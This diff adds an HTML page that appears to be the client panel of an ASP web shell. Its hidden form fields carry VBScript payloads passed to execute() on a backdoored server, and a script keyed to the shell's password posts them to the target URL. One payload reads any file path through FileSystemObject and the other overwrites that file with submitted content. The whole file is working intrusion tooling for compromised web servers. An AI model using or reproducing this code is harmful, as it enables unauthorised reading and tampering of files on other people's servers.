@@ -1,0 +1,21 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Edit&amp;View TextFile </div>
+<form method="post" name="xform" target="_blank">
+  <p>
+  Path: 
+  <input name="path" type="text" value="f:\test.txt" size="40">
+  <br>
+  <input type="hidden" name="code" value='execute("response.clear:thePath=request(""path""):Set FSOX=CreateObject(""Scripting.FileSystemObject""):StrResult=""The File <b>""&thePath&""</b> Content:<br><form method=post action=""&request(""url"")&""><textarea name=fileContent cols=100 rows=15>"":Set theFile = fsoX.OpenTextFile(thePath,1):StrResult=StrResult&theFile.ReadAll():theFile.Close:Set theFile=Nothing:StrResult=StrResult&""</textarea><div><input type=submit value=Submit><input type=hidden name=path value=""&thePath&""><input type=hidden value=""&request(""org"")&"" name=""&request(""x54"")&""></div></form>"":response.write(StrResult):response.end")'> 
+  <input type="hidden" name="x54" value=''> 
+  <input type="hidden" name="org" value=''>
+  </p>
+</form>
+<script>
+function RUNonclick(){
+document.xform.org.value = '\'execute("response.clear:thePath=request(""path""):Set FSOX=CreateObject(""Scripting.FileSystemObject""):Set theFile=fsoX.OpenTextFile(thePath,2,True):theFile.Write request(""fileContent""):theFile.Close:Set theFile=Nothing:response.write(""Edit <b>""&thePath&""</b> Success!""):response.end")\'';
+document.xform.x54.value = parent.pwd.value;
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
